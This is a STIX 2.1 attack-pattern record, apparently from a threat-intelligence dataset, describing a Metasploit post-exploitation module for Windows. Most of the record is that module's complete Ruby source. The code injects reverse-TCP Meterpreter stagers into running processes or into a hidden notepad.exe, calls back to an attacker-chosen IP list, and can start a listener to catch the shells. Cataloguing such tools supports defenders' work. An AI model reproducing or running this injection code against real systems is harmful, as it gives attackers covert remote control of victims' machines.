{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0a8a73c1-62b3-4c5d-9ac9-e05bda1ef3b9",
    "created": "2024-08-14T16:33:04.99306Z",
    "modified": "2024-08-14T16:33:04.993063Z",
    "name": "Windows Manage Inject in Memory Multiple Payloads",
    "description": " This module will inject in to several processes a given payload and connecting to a given list of IP Addresses. The module works with a given lists of IP Addresses and process PIDs if no PID is given it will start a the given process in the advanced options and inject the selected payload in to the memory of the created module.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/multi_meterpreter_inject.rb",
            "external_id": "multi_meterpreter_inject.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Inject in Memory Multiple Payloads',\n        'Description' => %q{\n          This module will inject in to several processes a given\n          payload and connecting to a given list of IP Addresses.\n          The module works with a given lists of IP Addresses and\n          process PIDs if no PID is given it will start a the given\n          process in the advanced options and inject the selected\n          payload in to the memory of the created module.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Carlos Perez <carlos_perez[at]darkoperator.com>',\n          'David Kennedy \"ReL1K\" <kennedyd013[at]gmail.com>' # added multiple payload support\n        ],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_attach\n              stdapi_sys_process_execute\n              stdapi_sys_process_memory_allocate\n              stdapi_sys_process_memory_write\n              stdapi_sys_process_thread_create\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('PAYLOAD', [false, 'Payload to inject in to process memory', 'windows/meterpreter/reverse_tcp']),\n        OptInt.new('LPORT', [false, 'Port number for the payload LPORT variable.', 4444]),\n        OptString.new('IPLIST', [true, 'List of semicolon separated IP list.', Rex::Socket.source_address('1.2.3.4')]),\n        OptString.new('PIDLIST', [false, 'List of semicolon separated PID list.', '']),\n        OptBool.new('HANDLER', [false, 'Start new exploit/multi/handler job on local box.', false]),\n        OptInt.new('AMOUNT', [false, 'Select the amount of shells you want to spawn.', 1])\n      ]\n    )\n\n    register_advanced_options(\n      [\n        OptString.new('PROCESSNAME', [false, 'Description', 'notepad.exe'])\n      ]\n    )\n  end\n\n  # Run Method for when run command is issued\n  def run\n    unless session.platform == 'windows' && [ARCH_X64, ARCH_X86].include?(session.arch)\n      print_error('This module requires native Windows meterpreter functions not compatible with the selected session')\n      return\n    end\n    # Set variables\n    multi_ip = nil\n    multi_pid = nil\n\n    print_status(\"Running module against #{sysinfo['Computer']}\")\n\n    if datastore['HANDLER']\n      create_multi_handler(datastore['PAYLOAD'], datastore['LPORT'])\n    end\n\n    multi_ip = datastore['IPLIST'].split(';')\n    multi_pid = datastore['PIDLIST'].split(';')\n\n    datastore['AMOUNT'].times do # iterate through number of shells\n      multi_ip.zip(multi_pid).each do |a|\n        # Check if we have an IP for the session\n        payload = create_payload(datastore['PAYLOAD'], a[0], datastore['LPORT'])\n        if a[1]\n          inject(a[1], payload)\n        else\n          # if no PID we create a process to host the Meterpreter session\n          pid_num = start_proc(datastore['PROCESSNAME'])\n          inject(pid_num, payload)\n        end\n        select(nil, nil, nil, 5)\n      end\n    end\n  end\n\n  # Function for injecting payload in to a given PID\n  #-------------------------------------------------------------------------------\n  def inject(target_pid, payload_to_inject)\n    print_status(\"Injecting meterpreter into process ID #{target_pid}\")\n    begin\n      host_process = session.sys.process.open(target_pid.to_i, PROCESS_ALL_ACCESS)\n      raw = payload_to_inject.generate\n      mem = host_process.memory.allocate(raw.length + (raw.length % 1024))\n\n      print_status(\"Allocated memory at address #{'0x%.8x' % mem}, for #{raw.length} byte stager\")\n      print_status('Writing the stager into memory...')\n      host_process.memory.write(mem, raw)\n      host_process.thread.create(mem, 0)\n      print_good(\"Successfully injected Meterpreter in to process: #{target_pid}\")\n    rescue ::Exception => e\n      print_error(\"Failed to Inject Payload to #{target_pid}!\")\n      print_error(e.message)\n    end\n  end\n\n  # Function for Creation of Connection Handler\n  #-------------------------------------------------------------------------------\n  def create_multi_handler(payload_to_inject, rport, rhost = '0.0.0.0')\n    print_status(\"Starting connection handler at port #{rport} for #{payload_to_inject}\")\n    mul = client.framework.exploits.create('multi/handler')\n    mul.datastore['WORKSPACE'] = session.workspace\n    mul.datastore['PAYLOAD'] = payload_to_inject\n    mul.datastore['LHOST'] = rhost\n    mul.datastore['LPORT'] = rport\n    mul.datastore['EXITFUNC'] = 'process'\n    mul.datastore['ExitOnSession'] = false\n\n    mul.exploit_simple(\n      'Payload' => mul.datastore['PAYLOAD'],\n      'RunAsJob' => true\n    )\n    print_good('exploit/multi/handler started!')\n  end\n\n  # Function for Creating the Payload\n  #-------------------------------------------------------------------------------\n  def create_payload(payload_type, lhost, lport)\n    print_status(\"Creating a reverse meterpreter stager: LHOST=#{lhost} LPORT=#{lport}\")\n    payload = payload_type\n    pay = client.framework.payloads.create(payload)\n    pay.datastore['LHOST'] = lhost\n    pay.datastore['LPORT'] = lport\n    return pay\n  end\n\n  # Function starting notepad.exe process\n  #-------------------------------------------------------------------------------\n  def start_proc(proc_name)\n    print_good('Starting Notepad.exe to house Meterpreter Session.')\n    proc = client.sys.process.execute(proc_name, nil, { 'Hidden' => true })\n    print_good(\"Process created with pid #{proc.pid}\")\n    return proc.pid\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}